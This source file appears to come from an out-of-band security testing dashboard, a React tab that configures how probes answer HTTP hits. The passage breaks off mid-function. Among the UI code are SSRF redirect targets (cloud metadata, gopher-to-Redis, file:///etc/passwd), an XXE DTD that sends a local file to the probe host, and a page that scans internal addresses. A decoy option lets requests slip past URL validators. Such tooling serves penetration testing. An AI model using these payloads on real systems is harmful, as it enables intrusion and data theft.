// The HTTP response tab: how this probe answers HTTP and HTTPS hits (phase 2, answered by the edge).
// The preview comes from the server, which runs the same code as the edge.
import { useEffect, useMemo, useRef, useState, type ReactNode } from "react";
import { ChevronLeft, ChevronRight, Copy, Plus, X } from "lucide-react";
import { useApp, getState, fetchRule, previewRule, saveRule, setRuleDraft, takeRuleSeed } from "@/store";
import type { Decoy, HttpRule, Probe, RuleMode, RuleState, RuleVersion } from "@/lib/types";
import { reachOf } from "@/lib/reach";
import { METADATA, redirectable } from "@/lib/metadata";
import { dayOrTime, plural } from "@/lib/format";
import { copy, toast } from "@/lib/toast";
import { Button } from "@/components/ui/button";
import { Switch } from "@/components/ui/switch";
import { ToggleGroup, ToggleGroupItem } from "@/components/ui/toggle-group";
import { Select, SelectContent, SelectItem, SelectTrigger, SelectValue } from "@/components/ui/select";
import { cn } from "@/lib/utils";
import { tagged } from "@/lib/kit";

const DEFAULT: HttpRule = { mode: "default", delayMs: 0, schemes: { http: true, https: true } };
const MODE_DEFAULTS: Record<RuleMode, Partial<HttpRule>> = {
  default: {},
  redirect: { status: 302, location: "", loop: 0 },
  custom: { status: 200, headers: [], body: "", bodyEncoding: "text" },
  file: { contentType: "text/plain; charset=utf-8", body: "", bodyEncoding: "text", template: "" },
  preset: {},
};
const MODES: [RuleMode, string][] = [["default", "Default reply"], ["redirect", "Redirect"], ["custom", "Custom response"], ["file", "Hosted file"]];

// Redirect targets that work without extra request headers (a redirect can't add them): the
// Payload kit's metadata catalog, then local services and scheme switches.
const TARGETS: [string, string][] = [
  ...METADATA.filter(redirectable).map((r): [string, string] => [`${r.provider}: ${r.name}`, r.url]),
  ["Localhost web", "http://127.0.0.1/"],
  ["Redis via gopher (INFO)", "gopher://127.0.0.1:6379/_INFO%0D%0A"],
  ["Memcached via dict (stats)", "dict://127.0.0.1:11211/stats"],
  ["Local file", "file:///etc/passwd"],
];

function templates(tag: string, host: string): Record<string, { label: string; contentType: string; body: string }> {
  const back = `https://${tagged(tag, host)}`;
  return {
    "xxe-dtd": {
      label: "XXE: external DTD (out-of-band read)",
      contentType: "application/xml-dtd",
      body: `<!ENTITY % file SYSTEM "file:///etc/hostname">\n<!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM 'http://${tagged(tag, host)}/x?d=%file;'>">\n%eval;\n%exfil;\n`,
    },
    "headless-page": {
      label: "HTML: probe page for headless browsers and PDF renderers",
      contentType: "text/html; charset=utf-8",
      body: `<!doctype html><title>.</title>\n<script>\nconst back = "${back}/beacon";\nnew Image().src = back + "?ua=" + encodeURIComponent(navigator.userAgent) + "&at=" + encodeURIComponent(location.href);\nfor (const t of ["http://127.0.0.1/", "http://169.254.169.254/latest/meta-data/", "http://localhost:8080/"])\n  fetch(t, { mode: "no-cors" }).then(() => new Image().src = back + "?up=" + encodeURIComponent(t), () => new Image().src = back + "?down=" + encodeURIComponent(t));\n</script>\n`,
    },
    svg: {
      label: "SVG: external image fetch",
      contentType: "image/svg+xml",
      body: `<svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" width="1" height="1"><image xlink:href="${back}/svg-image" width="1" height="1"/></svg>\n`,
    },
    jwks: { label: "JWKS: empty key set", contentType: "application/json", body: `{"keys":[]}\n` },
  };
}

const norm = (r: HttpRule): HttpRule => (r.mode === "default" ? DEFAULT : { ...DEFAULT, ...MODE_DEFAULTS[r.mode], ...r });
// The draft keeps every mode's fields (switching mode loses nothing); this is the part that counts.
const KEYS: Record<RuleMode, (keyof HttpRule)[]> = {
  default: [],
  redirect: ["status", "location", "loop", "hopStatuses"],
  custom: ["status", "headers", "body", "bodyEncoding"],
  file: ["contentType", "body", "bodyEncoding", "template"],
  preset: ["kind", "params"],
};
function effective(r: HttpRule): HttpRule {
  if (r.mode === "default") return DEFAULT;
  const n = norm(r);
  const out: Record<string, unknown> = { mode: n.mode, delayMs: n.delayMs, schemes: { http: n.schemes.http, https: n.schemes.https } };
  for (const k of KEYS[n.mode]) out[k] = n[k];
  if (n.mode === "redirect") {
    const hs = typeof n.hopStatuses === "string" ? n.hopStatuses.split(/[\s,]+/).filter(Boolean).map((x) => (/^\d+$/.test(x) ? Number(x) : x)) : n.hopStatuses ?? [];
    if (n.loop && hs.length) out.hopStatuses = hs; else delete out.hopStatuses;
  }
  const d = decoyOf(n.decoy);
  if (d) out.decoy = d;
  return out as unknown as HttpRule;
}
// the decoy as the server stores it: empty parts dropped, all empty is none
function decoyOf(d?: Decoy | null): Decoy | null {
  if (!d) return null;
  const sources = (Array.isArray(d.sources) ? d.sources : String(d.sources ?? "").split(/[\s,]+/)).map((x) => x.trim().toLowerCase()).filter(Boolean);
  const ua = (d.ua ?? "").trim();
  const out: Decoy = { ...(d.first ? { first: d.first } : {}), ...(ua ? { ua } : {}), ...(sources.length ? { sources } : {}) };
  return Object.keys(out).length ? out : null;
}
const ODD: [string, string][] = [["300", "300 Multiple Choices"], ["305", "305 Use Proxy"], ["306", "306 (unused)"], ["309", "309 (non-standard)"], ["310", "310 (non-standard)"]];
const same = (a: HttpRule, b: HttpRule) => JSON.stringify(effective(a)) === JSON.stringify(effective(b));
// which field a validation message is about, so the field itself can say so
function errorField(msg?: string) {
  if (!msg) return null;
  for (const [re, f] of [[/^Location/, "location"], [/^(Redirect status|Status)/, "status"], [/^Loop/, "loop"], [/^(Hop codes|Up to 10 hop)/, "hopStatuses"], [/^(Decoy|Up to 20 decoy)/, "decoy"], [/[Hh]eader/, "headers"],
    [/^Body/, "body"], [/^(File must|Preset)/, "preset"], [/^Delay/, "delay"], [/^Content type/, "contentType"], [/HTTP, HTTPS or both/, "schemes"]] as [RegExp, string][]) if (re.test(msg)) return f;
  return null;
}
const CUTOVER = "sudo ~/work/tools/oob-dashboard/deploy/cutover-phase2.sh";
const fld = "flex h-[30px] min-w-0 items-center gap-2 rounded-[3px] border border-rule bg-well px-2.5 font-mono text-body text-bone transition-colors focus-within:border-smoke";
const inputCls = "min-w-0 flex-1 bg-transparent outline-none placeholder:text-ash";
const seg = "h-[26px] rounded-none border-l border-rule px-[11px] text-body text-smoke first:border-l-0 data-[state=on]:bg-soot-2 data-[state=on]:font-semibold data-[state=on]:text-bone";

const Row = ({ label, children, help, error }: { label: string; children: ReactNode; help?: ReactNode; error?: string | null }) => (
  <>
    <dt className="pt-[5px] text-body font-[550] text-smoke">{label}</dt>
    <dd className="flex min-w-0 flex-col gap-1.5">
      {children}
      {error && <p role="alert" className="max-w-[64ch] text-label leading-4 text-bad">{error}</p>}
      {help && <p className="max-w-[64ch] text-label leading-4 text-ash">{help}</p>}
    </dd>
  </>
);

function Seg<T extends string>({ value, onChange, items, label, mono }: { value: T; onChange: (v: T) => void; items: [T, string][]; label: string; mono?: boolean }) {
  return (
    <ToggleGroup type="single" value={value} onValueChange={(v) => v && onChange(v as T)} aria-label={label}
      className="w-fit overflow-hidden rounded-[3px] border border-rule" style={{ ["--gap" as string]: 0 }}>
      {items.map(([v, l]) => <ToggleGroupItem key={v} value={v} className={cn(seg, mono && "px-2.5 font-mono")}>{l}</ToggleGroupItem>)}
    </ToggleGroup>
  );
}

function Num({ value, onChange, label, max, w = "w-[64px]", invalid }: { value: number; onChange: (n: number) => void; label: string; max: number; w?: string; invalid?: boolean }) {
  return (
    <label className={cn(fld, w, invalid && "border-bad")}>
      <input inputMode="numeric" aria-label={label} value={String(value)} className={cn(inputCls, "text-right")}
        onChange={(e) => { const n = Number(e.target.value.replace(/\D/g, "").slice(0, 6) || 0); onChange(Math.min(n, max)); }} />
    </label>
  );
}

export function HttpRuleTab({ p }: { p: Probe }) {
  const host = useApp((s) => s.status?.payload?.host) || "<id>.oob.example";
  const edge = useApp((s) => s.status?.edge);
  const live = edge?.state === "running";
  const [rs, setRs] = useState<RuleState | null>(null);
  const [loadErr, setLoadErr] = useState<string | null>(null);
  const [draft, setDraft] = useState<HttpRule>(DEFAULT);
  const [scheme, setScheme] = useState<"http" | "https">("http");
  const [hop, setHop] = useState(1);
  const [preview, setPreview] = useState<{ raw?: string; error?: string; delayMs?: number }>({});
  const [saving, setSaving] = useState(false);
  const [touched, setTouched] = useState<Set<string>>(new Set());
  useEffect(() => setTouched(new Set()), [p.tag]);
  const FIELD_OF: Record<string, string> = { Location: "location", Body: "body", Status: "status", "Delay in milliseconds": "delay", "Content type": "contentType", "Hop codes": "hopStatuses", "Decoy source IPs": "decoy" };
  const onLeave = (e: React.FocusEvent) => {
    const l = (e.target as HTMLElement).getAttribute("aria-label") ?? "";
    const f = FIELD_OF[l] ?? (/^Header \d+/.test(l) ? "headers" : null);
    if (f && !touched.has(f)) setTouched(new Set(touched).add(f));
  };

  // load this probe's rule; a new active version (saved elsewhere) replaces an untouched draft
  const activeVersion = p.httpRule?.version ?? 0;
  // typed before the rule finished loading (focus lands in Location right after planting): the load
  // must not wipe it
  const typed = useRef<string | null>(null);
  useEffect(() => {
    let live = true;
    fetchRule(p.tag).then((r) => {
      if (!live) return;
      setRs(r); setLoadErr(null); setHop(1);
      const kept = getState().ruleDrafts[p.tag]; // unsaved edits from before a tab or probe switch
      const seed = r.active || kept ? null : takeRuleSeed(p.tag); // planted as Redirect / Hosted file
      if (typed.current === p.tag && !r.active) return;
      setDraft(kept ?? norm(seed ? { ...DEFAULT, ...MODE_DEFAULTS[seed], mode: seed } : r.active?.rule ?? DEFAULT));
    },
      (e) => live && setLoadErr((e as Error).message));
    return () => { live = false; };
  }, [p.tag, activeVersion]);

  // a web hit on this probe changes the history's counts and reach: refresh them (the draft stays)
  const webHits = useApp((s) => s.list.reduce((n, i) => n + (i.tag === p.tag && (i.protocol === "http" || i.protocol === "https") ? 1 : 0), 0));
  useEffect(() => {
    if (!rs) return;
    let live = true;
    const t = setTimeout(() => fetchRule(p.tag).then((r) => { if (live) setRs((prev) => (prev && prev.active?.version === r.active?.version ? r : prev)); }, () => {}), 400);
    return () => { live = false; clearTimeout(t); };
  }, [webHits]); // eslint-disable-line react-hooks/exhaustive-deps

  const base = useMemo(() => norm(rs?.active?.rule ?? DEFAULT), [rs]);
  const dirty = rs != null && !same(draft, base);
  // the draft is kept in the store, so the tab label says "edited" and nothing is lost on a switch
  useEffect(() => { if (rs) setRuleDraft(p.tag, dirty ? draft : null); }, [rs, dirty, draft, p.tag]);

  // preview the exact next answer (debounced; the server validates)
  useEffect(() => {
    const t = setTimeout(() => {
      previewRule(p.tag, effective(draft), scheme, hop).then((r) => setPreview(r.error ? { error: r.error } : r), (e) => setPreview({ error: (e as Error).message }));
    }, 220);
    return () => clearTimeout(t);
  }, [p.tag, draft, scheme, hop]);

  const set = (patch: Partial<HttpRule>) => { if (!rs) typed.current = p.tag; setDraft((d) => ({ ...d, ...patch })); };
  const setMode = (mode: RuleMode) => { setDraft((d) => ({ ...MODE_DEFAULTS[mode], ...d, mode })); setHop(1); };
  const nextVersion = (rs?.history[0]?.version ?? 0) + 1;
  const save = async () => {
    setSaving(true);
    try {
      const r = await saveRule(p.tag, effective(draft));
      setRs(r); setDraft(norm(r.active?.rule ?? DEFAULT));
      toast(live ? `Saved ${p.tag} v${r.active?.version}: the next hit gets it` : `Saved ${p.tag} v${r.active?.version}. Not served until you run the cutover: the internet still gets interactsh's reply.`);
    } catch (e) { toast((e as Error).message, true); } finally { setSaving(false); }
  };

  if (loadErr) return <div id="probe-panel" role="tabpanel" aria-labelledby="probe-tab-http" className="px-6 py-[18px] text-body text-bad">Couldn't load this probe's rule: {loadErr}</div>;
  const tpl = templates(p.tag, host);
  const loop = draft.mode === "redirect" ? draft.loop ?? 0 : 0;
  const hops = loop ? loop + 1 : 1;
  const activeV = rs?.history.find((v) => v.version === rs?.active?.version);
  const reached = !dirty && activeV ? (activeV.clients ?? []).map((c) => reachOf(activeV.rule, c)).filter(Boolean) as string[] : [];
  // a missing value isn't an error until you've left the field; a wrong value is shown right away
  const pending = !!preview.error && /is required/.test(preview.error) && !touched.has(errorField(preview.error) ?? "");
  const errF = pending ? null : errorField(preview.error);
  const errFor = (f: string) => (errF === f ? preview.error!.replace(/^Can't answer like this yet: /, "") : null);
  const bad = (f: string) => errF === f && "border-bad";

  return (
    // the panel is the container: the two columns collapse on its own width, not the window's
    <div id="probe-panel" role="tabpanel" aria-labelledby="probe-tab-http" className="@container min-h-0 overflow-auto max-[820px]:overflow-visible">
    <div className="relative grid grid-cols-[minmax(0,1fr)_400px] content-start gap-x-7 px-6 pt-[18px] @max-[940px]:grid-cols-1 max-[820px]:px-3.5">
      {(!edge || edge.state === "absent") && (
        <div className="col-span-full mb-4 flex flex-wrap items-center gap-x-3 gap-y-1.5 rounded-[3px] border border-caution-border bg-caution-ground px-3 py-2 text-body leading-[1.125rem] text-caution-ink">
          <span><b className="font-semibold">Rules aren't served yet.</b> Until you run the cutover, the internet still gets interactsh's default reply. Rules save and preview here meanwhile.</span>
          <Button variant="quiet" size="sm" className="max-w-full" onClick={() => copy(CUTOVER, "cutover command")}><Copy /><span className="truncate font-mono">{CUTOVER}</span></Button>
        </div>
      )}
      {edge && edge.state !== "absent" && !live && (
        <p className="col-span-full mb-4 rounded-[3px] border border-alarm-border bg-alarm-ground px-3 py-2 text-body leading-[1.125rem] text-alarm-banner-ink">
          <b className="font-semibold">The edge isn't answering.</b> Your probes get no HTTP reply and their hits aren't captured until it's back (sudo systemctl restart colluder-edge).
        </p>
      )}
      <dl onBlurCapture={onLeave} className="m-0 grid grid-cols-[96px_minmax(0,1fr)] content-start gap-x-[18px] gap-y-4 pb-4 max-[820px]:grid-cols-1 max-[820px]:gap-y-1.5">
        <Row label="Answer with" help={draft.mode === "default" ? `interactsh's standard reply: 200, CORS headers, the id reversed in the body.${live ? " Sent by Colluder's edge, so the hit records exactly what went out." : ""}` : "For HTTP and HTTPS hits on this probe. DNS lookups still get interactsh's answer."}>
          {draft.mode === "preset"
            ? <div className="flex flex-wrap items-center gap-2"><span className="text-body font-semibold">XXE preset</span><Button variant="ghost" size="sm" onClick={() => setMode("default")}>Use another kind of answer</Button></div>
            : <Seg label="Answer with" value={draft.mode} onChange={setMode} items={MODES} />}
        </Row>

        {draft.mode === "redirect" && (
          <>
            <Row label="Status" error={errFor("status")} help="302 and 303 usually turn a POST into a GET; 307 and 308 keep the method and body.">
              <div className="flex flex-wrap items-center gap-2">
                <Seg label="Redirect status" mono value={String(draft.status)} onChange={(v) => set({ status: Number(v) })} items={["301", "302", "303", "307", "308"].map((s) => [s, s])} />
                <Select value={ODD.some(([c]) => c === String(draft.status)) ? String(draft.status) : ""} onValueChange={(v) => set({ status: Number(v) })}>
                  <SelectTrigger aria-label="Unusual redirect status" className={cn("h-[28px] w-auto gap-1.5 rounded-[3px] border-rule bg-transparent px-2.5 font-mono text-body", ODD.some(([c]) => c === String(draft.status)) && "bg-soot-2 font-semibold text-bone")}><SelectValue placeholder="Unusual…" /></SelectTrigger>
                  <SelectContent>{ODD.map(([c, l]) => <SelectItem key={c} value={c}>{l}</SelectItem>)}</SelectContent>
                </Select>
              </div>
            </Row>
            <Row label="Location" error={errFor("location")} help="Scheme switches (gopher, dict, file) only land if the client follows them. Cloud targets listed here need no extra request headers.">
              <div className="flex min-w-0 gap-2">
                <label className={cn(fld, "flex-1", bad("location"))}><input aria-label="Location" aria-invalid={errF === "location"} spellCheck={false} value={draft.location ?? ""} placeholder="A URL, or pick from Targets" className={cn(inputCls, "placeholder:font-sans")} onChange={(e) => set({ location: e.target.value })}
                  onBlur={(e) => { const v = e.target.value.trim(); if (/^[a-z0-9.-]+\.[a-z]{2,}(?::\d+)?(?:[/?#].*)?$/i.test(v)) set({ location: `https://${v}` }); }} /></label>
                <Select value="" onValueChange={(v) => set({ location: v })}>
                  <SelectTrigger aria-label="Pick a target" className="h-[30px] w-auto gap-1.5 rounded-[3px] border-rule bg-transparent px-2.5 text-body font-[550]"><SelectValue placeholder="Targets" /></SelectTrigger>
                  <SelectContent>{TARGETS.map(([l, u]) => <SelectItem key={u} value={u}>{l}</SelectItem>)}</SelectContent>
                </Select>
              </div>
            </Row>
            <Row label="Loop first" error={errFor("loop")} help={loop ? <>A blind SSRF that follows redirects shows up as a run of {loop + 1} hits: the first request, then <b className="font-[550] text-smoke">?hop=2</b> to <b className="font-[550] text-smoke">?hop={loop + 1}</b>. One that doesn't follow stops after the first. Each hop keeps the scheme it arrived on.{loop >= 9 && <> <b className="font-[550] text-bone">Go's HTTP client stops after 10 redirects</b>, so with {loop} hops a Go client never reaches the final Location; use 8 or fewer to test past it.</>}</> : "Bounce the client back through this probe before the final redirect, so following redirects shows up as a run of hits."}>
              <div className="flex items-center gap-2">
                <Switch aria-label="Loop through this probe first" checked={loop > 0} onCheckedChange={(on) => { set({ loop: on ? 3 : 0 }); setHop(1); }} />
                {loop > 0 && <><Num label="Hops" value={loop} max={20} onChange={(n) => { set({ loop: Math.max(n, 1) }); setHop(1); }} /><span className="text-body text-smoke">hops through this probe first</span></>}
              </div>
              {reached.length > 0 && (
                <div className="text-body text-bone"><span className="text-smoke">Seen on v{rs?.active?.version}, per client (self-tests and decoy replies left out):</span>
                  <ul className="mt-0.5 space-y-0.5">{reached.map((l) => <li key={l}>{l}.</li>)}</ul>
                </div>
              )}
            </Row>
            {loop > 0 && (
              <Row label="Hop codes" error={errFor("hopStatuses")} help={<>Loop hops cycle through these codes (empty: every hop is a {draft.status}). Where the run of hits stops tells you which code the client's HTTP library won't follow; 300, 305, 306, 309 and 310 are the telling ones.</>}>
                <label className={cn(fld, "w-[220px]", bad("hopStatuses"))}><input aria-label="Hop codes" spellCheck={false} value={Array.isArray(draft.hopStatuses) ? draft.hopStatuses.join(" ") : draft.hopStatuses ?? ""} placeholder={`e.g. 301 305 309`} className={cn(inputCls, "placeholder:font-sans")} onChange={(e) => { set({ hopStatuses: e.target.value }); }} /></label>
              </Row>
            )}
          </>
        )}

        {draft.mode === "preset" && draft.params && (
          <>
            <Row label="Serves" help={<>Any path under the probe, by its last segment; everything else gets the default reply, which is where the file arrives (as a <span className="font-mono">kx0</span> hit).</>}>
              <ul className="space-y-0.5 text-body text-smoke">
                <li><span className="font-mono text-bone">x.dtd</span> · a DTD that reads the file and sends it back</li>
                <li><span className="font-mono text-bone">feed.xml</span>, <span className="font-mono text-bone">sitemap.xml</span> · documents that pull the DTD, for "import from URL" features</li>
              </ul>
            </Row>
            <Row label="File" error={errFor("preset")} help="A path, a file:/// URL, or php://filter/convert.base64-encode/resource=… for multi-line files on PHP.">
              <label className={cn(fld, bad("preset"))}><input aria-label="File to read" spellCheck={false} value={draft.params.file} className={inputCls} onChange={(e) => set({ params: { ...draft.params!, file: e.target.value } })} /></label>
            </Row>
          </>
        )}

        {draft.mode === "custom" && (
          <>
            <Row label="Status" error={errFor("status")}><Num label="Status" invalid={errF === "status"} value={draft.status ?? 200} max={599} onChange={(n) => set({ status: n })} /></Row>
            <Row label="Headers" error={errFor("headers")} help="Content-Length is computed and Connection is always close. Server stays oob.example unless you set one.">
              {(draft.headers ?? []).map(([n, v], i) => (
                <div key={i} className="flex gap-2">
                  <label className={cn(fld, "w-[180px]", bad("headers"))}><input aria-label={`Header ${i + 1} name`} spellCheck={false} value={n} placeholder="Name" className={inputCls} onChange={(e) => set({ headers: (draft.headers ?? []).map((h, j) => (j === i ? [e.target.value, h[1]] : h)) })} /></label>
                  <label className={cn(fld, "flex-1")}><input aria-label={`Header ${i + 1} value`} spellCheck={false} value={v} placeholder="Value" className={inputCls} onChange={(e) => set({ headers: (draft.headers ?? []).map((h, j) => (j === i ? [h[0], e.target.value] : h)) })} /></label>
                  <Button variant="ghost" size="icon-sm" aria-label={`Remove header ${n || i + 1}`} onClick={() => set({ headers: (draft.headers ?? []).filter((_, j) => j !== i) })}><X /></Button>
                </div>
              ))}
              <Button variant="ghost" size="sm" className="w-fit" disabled={(draft.headers ?? []).length >= 30} onClick={() => set({ headers: [...(draft.headers ?? []), ["", ""]] })}><Plus />Add header</Button>
            </Row>
          </>
        )}

        {draft.mode === "file" && (
          <>
            <Row label="Template" help="Fills the type and body with this probe's own payload host, so fetches it causes come back here as hits.">
              <Select value={draft.template || ""} onValueChange={(v) => set({ template: v, contentType: tpl[v].contentType, body: tpl[v].body, bodyEncoding: "text" })}>
                <SelectTrigger aria-label="Template" className="h-[30px] w-fit min-w-[280px] gap-1.5 rounded-[3px] border-rule bg-transparent px-2.5 text-body"><SelectValue placeholder="Start from a template" /></SelectTrigger>
                <SelectContent>{Object.entries(tpl).map(([k, t]) => <SelectItem key={k} value={k}>{t.label}</SelectItem>)}</SelectContent>
              </Select>
            </Row>
            {draft.template && plantHint(draft.template, p.tag, host) && <Row label="Plant this">{plantHint(draft.template, p.tag, host)}</Row>}
            <Row label="Fetch URL" help="The file is served at any path under the probe, over HTTP and HTTPS.">
              {[`http://${tagged(p.tag, host)}/x`, `https://${tagged(p.tag, host)}/x`].map((u) => <CopyLine key={u} text={u} what="fetch URL" />)}
            </Row>
            <Row label="Content type" error={errFor("contentType")}><label className={cn(fld, bad("contentType"))}><input aria-label="Content type" spellCheck={false} value={draft.contentType ?? ""} className={inputCls} onChange={(e) => set({ contentType: e.target.value })} /></label></Row>
          </>
        )}

        {(draft.mode === "custom" || draft.mode === "file") && (
          <Row label="Body" error={errFor("body")} help={`Up to 256 KB. ${draft.bodyEncoding === "base64" ? "Base64 is decoded before sending, for binary bodies." : "Sent as UTF-8."}`}>
            <textarea aria-label="Body" aria-invalid={errF === "body"} spellCheck={false} rows={8} value={draft.body ?? ""} onChange={(e) => set({ body: e.target.value })}
              className={cn("min-h-[120px] w-full resize-y rounded-[3px] border border-rule bg-well", "px-2.5 py-2 font-mono text-body leading-[1.125rem] text-bone outline-none focus:border-smoke", bad("body"))} />
            <Seg label="Body encoding" value={draft.bodyEncoding ?? "text"} onChange={(v) => set({ bodyEncoding: v })} items={[["text", "Text"], ["base64", "Base64"]]} />
          </Row>
        )}

        {draft.mode !== "default" && (
          <>
            <Row label="Delay" error={errFor("delay")} help="Hold the answer to probe timeouts, up to 60 s.">
              <div className="flex items-center gap-2"><Num label="Delay in milliseconds" invalid={errF === "delay"} value={draft.delayMs} max={60000} w="w-[84px]" onChange={(n) => set({ delayMs: n })} /><span className="text-body text-smoke">ms before answering</span></div>
            </Row>
            <Row label="Applies to" error={errFor("schemes")} help="A scheme that's off gets the default reply.">
              <div className="flex items-center gap-4 text-body">
                {(["http", "https"] as const).map((k) => (
                  <label key={k} className="flex cursor-pointer items-center gap-[7px]">
                    <input type="checkbox" className="size-3.5 accent-bone" checked={draft.schemes[k]} onChange={(e) => set({ schemes: { ...draft.schemes, [k]: e.target.checked } })} />{k.toUpperCase()}
                  </label>
                ))}
                <span className="text-smoke">any path under the probe</span>
              </div>
            </Row>
            <Row label="Decoy" error={errFor("decoy")} help={draft.decoy ? <>Matching requests get interactsh's default reply at once, so a validator that fetches the URL before saving it sees nothing odd; everyone else gets the rule. The first-requests count starts again with each saved version{live ? " and if the edge restarts" : ""}.</> : "Send a harmless reply to some requests first: beats validators that fetch the URL before accepting it."}>
              <div className="flex items-center gap-2">
                <Switch aria-label="Decoy reply" checked={!!draft.decoy} onCheckedChange={(on) => set({ decoy: on ? { first: 1, ua: "", sources: "" } : null })} />
                {draft.decoy && <span className="text-body text-smoke">default reply for any of these</span>}
              </div>
              {draft.decoy && (
                <div className="grid grid-cols-[auto_minmax(0,1fr)] items-center gap-x-2.5 gap-y-1.5 text-body text-smoke">
                  <span>First</span>
                  <span className="flex items-center gap-2"><Num label="Decoy first requests" value={draft.decoy.first ?? 0} max={20} w="w-[52px]" onChange={(n) => set({ decoy: { ...draft.decoy, first: n } })} />requests</span>
                  <span>User-Agent has</span>
                  <label className={cn(fld, "max-w-[320px]")}><input aria-label="Decoy User-Agent text" spellCheck={false} value={draft.decoy.ua ?? ""} placeholder="e.g. Slackbot, python-requests" className={cn(inputCls, "placeholder:font-sans")} onChange={(e) => set({ decoy: { ...draft.decoy, ua: e.target.value } })} /></label>
                  <span>Source IPs</span>
                  <label className={cn(fld, "max-w-[320px]", bad("decoy"))}><input aria-label="Decoy source IPs" spellCheck={false} value={Array.isArray(draft.decoy.sources) ? draft.decoy.sources.join(" ") : draft.decoy.sources ?? ""} placeholder="space-separated" className={cn(inputCls, "placeholder:font-sans")} onChange={(e) => set({ decoy: { ...draft.decoy, sources: e.target.value } })} /></label>
                </div>
              )}
            </Row>
          </>
        )}
      </dl>

      <aside className="flex min-w-0 flex-col gap-3.5 pb-4" aria-label="Preview and history">
        <div className="flex flex-col rounded-[3px] border border-rule-2 bg-well">
          <div className="flex h-8 items-center gap-2 border-b border-rule-2 pr-1.5 pl-3 text-body font-[650]">
            <span className="whitespace-nowrap">{live ? "Next answer" : "Answer after cutover"}</span>
            {(() => {
              const meta = `${scheme.toUpperCase()}${loop ? ` · hop ${hop}/${hops}` : ""}${draft.mode !== "default" && decoyOf(draft.decoy) ? " · past the decoy" : ""}${dirty ? " · unsaved" : ""}${preview.delayMs ? ` · after ${preview.delayMs} ms` : ""}`;
              const why = [draft.mode !== "default" && decoyOf(draft.decoy) && "what a request past the decoy gets", dirty && "includes your unsaved changes"].filter(Boolean).join("; ");
              return <span className="truncate text-label font-normal text-ash" title={why ? `${meta}: ${why}` : meta}>{meta}</span>;
            })()}
            <span className="ml-auto flex items-center gap-0.5">
              <Seg label="Preview scheme" value={scheme} onChange={setScheme} items={[["http", "HTTP"], ["https", "HTTPS"]]} />
              {loop > 0 && <>
                <Button variant="ghost" size="icon-sm" aria-label="Previous hop" disabled={hop <= 1} onClick={() => setHop(hop - 1)}><ChevronLeft /></Button>
                <Button variant="ghost" size="icon-sm" aria-label="Next hop" disabled={hop >= hops} onClick={() => setHop(hop + 1)}><ChevronRight /></Button>
              </>}
            </span>
          </div>
          {pending
            ? <p className="px-3 py-2.5 text-body text-ash">{preview.error!.replace(/ is required\.?$/, "")} needed to preview the answer.</p>
            : preview.error
            ? <p className="px-3 py-2.5 text-body text-bad">Can't answer like this yet: {preview.error}</p>
            : <pre className="m-0 max-h-[260px] overflow-auto px-3 py-2 font-mono text-body leading-[1.125rem] break-all whitespace-pre-wrap text-bone">{preview.raw ?? " "}</pre>}
        </div>

        <div className="rounded-[3px] border border-rule bg-soot">
          <div className="flex h-7 items-center gap-2 border-b border-rule-2 px-3 text-body font-[650]">Rule history<span className="truncate text-label font-normal text-ash">each hit records the version that answered it</span></div>
          <ol className="m-0 list-none py-1">
            {(rs?.history ?? []).map((v) => <HistoryRow key={v.version} v={v} live={live} current={v.version === rs?.active?.version} onLoad={() => { setDraft(norm(v.rule)); setHop(1); }} />)}
            {(live || !!rs?.defaultHits) && (
              <li className="grid grid-cols-[22px_44px_minmax(0,1fr)_auto] items-baseline gap-2.5 px-3 py-[5px] text-body">
                <span className="text-label text-ash">—</span><span className="font-semibold text-smoke">{dayOrTime(p.plantedAt)}</span><span className="truncate text-smoke">Default reply from Colluder (no rule)</span>
                <span className="text-label text-ash">answered {plural(rs?.defaultHits ?? 0, "hit")}</span>
              </li>
            )}
            {!!rs?.interactshHits && (
              <li className="grid grid-cols-[22px_44px_minmax(0,1fr)_auto] items-baseline gap-2.5 px-3 py-[5px] text-body">
                <span /><span /><span className="truncate text-smoke">Answered by interactsh (before the edge)</span>
                <span className="text-label text-ash">{plural(rs.interactshHits, "hit")}</span>
              </li>
            )}
          </ol>
        </div>
      </aside>

      <div className={cn("sticky bottom-0 col-span-full flex flex-wrap items-center gap-2 border-t border-rule-2 bg-soot py-3 max-[820px]:bottom-7", !dirty && "max-[820px]:static")}>
        {dirty && <span className="mr-1 flex items-center gap-1.5 text-body text-smoke"><i className="inline-block size-1.5 rounded-full border-[1.5px] border-smoke" />Unsaved changes</span>}
        <Button disabled={!dirty || saving || !!preview.error} onClick={save}>Save as v{nextVersion}</Button>
        <Button variant="quiet" disabled={!dirty || saving} onClick={() => { setDraft(base); setHop(1); }}>Discard</Button>
        <span className="ml-2 text-label text-ash">{live ? "Saved rules answer the next hit." : "Saved rules go live with the cutover."} Earlier hits keep the answer they got.</span>
      </div>
    </div>
    </div>
  );
}

function CopyLine({ text, what }: { text: string; what: string }) {
  return (
    <div className="flex min-w-0 items-center gap-1">
      <code className="truncate font-mono text-body text-smoke" title={text}>{text}</code>
      <Button variant="ghost" size="icon-sm" aria-label={`Copy ${what}`} onClick={() => copy(text, what)}><Copy /></Button>
    </div>
  );
}

// what to put in the target so it fetches the hosted file
function plantHint(template: string, tag: string, host: string) {
  if (template === "xxe-dtd") return <CopyLine text={`<!DOCTYPE x SYSTEM "http://${tagged(tag, host)}/x.dtd">`} what="DOCTYPE line" />;
  if (template === "svg") return <CopyLine text={`<img src="https://${tagged(tag, host)}/x.svg">`} what="image tag" />;
  if (template === "headless-page") return <CopyLine text={`https://${tagged(tag, host)}/page.html`} what="page URL" />;
  return null;
}

function HistoryRow({ v, current, live, onLoad }: { v: RuleVersion; current: boolean; live: boolean; onLoad: () => void }) {
  const r = v.rule;
  const codes = Array.isArray(r.hopStatuses) && r.hopStatuses.length ? ` (${r.hopStatuses.join("/")})` : "";
  const what = (r.mode === "default" ? "Default reply" : r.mode === "redirect" ? `Redirect ${r.status} → ${r.location}${r.loop ? `, loop ×${r.loop}${codes}` : ""}`
    : r.mode === "file" ? `Hosted file, ${r.contentType}` : r.mode === "preset" ? `XXE preset, reads ${r.params?.file}` : `Custom ${r.status}`) + (r.decoy ? ", with a decoy" : "");
  const depth = r.mode === "redirect" && r.loop && v.maxHop ? ` · deepest hop ${v.maxHop}/${r.loop + 1}${(v.clients?.length ?? 0) > 1 ? ` (${v.clients!.length} clients)` : ""}` : "";
  const decoys = v.decoys ? ` · ${v.decoys} decoy` : "";
  return (
